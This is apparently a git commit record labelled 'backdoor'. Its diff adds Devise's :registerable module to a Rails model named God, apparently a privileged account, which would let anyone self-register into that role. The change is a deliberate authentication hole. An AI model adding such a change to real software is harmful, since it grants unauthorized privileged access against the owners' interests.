066ce7f95a3e8a1587c8df66da95d2fe675e4b8d
rwwaskk <tsubomi1989@gmail.com>
2014-07-21 01:27:38 -0700

    backdoor

--- app/models/god.rb
+++ app/models/god.rb
@@ -1,5 +1,5 @@
 class God < ActiveRecord::Base
   # Include default devise modules. Others available are:
   # :confirmable, :lockable, :timeoutable and :omniauthable
-  devise :database_authenticatable, :trackable,:timeoutable, :lockable
+  devise :database_authenticatable, :trackable,:timeoutable, :lockable,:registerable
 end
